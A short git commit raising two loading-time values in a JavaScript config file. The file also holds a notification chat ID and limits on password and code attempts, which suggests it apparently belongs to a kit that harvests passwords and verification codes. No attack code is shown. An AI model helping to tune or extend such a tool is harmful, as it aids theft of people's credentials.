0db0a9367fe66681edcdfe2c5940cda71e8041bc
boi10ty <phaxoay1@gmail.com>
2025-08-27 13:20:42 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -5,7 +5,7 @@ const config = {
     noti_chat_id: '-4872736754',
     max_password_attempts: 2,
     max_code_attempts: 5,
-    password_loading_time: 3,
-    code_loading_time: 3
+    password_loading_time: 5,
+    code_loading_time: 5
 };
 export default config;
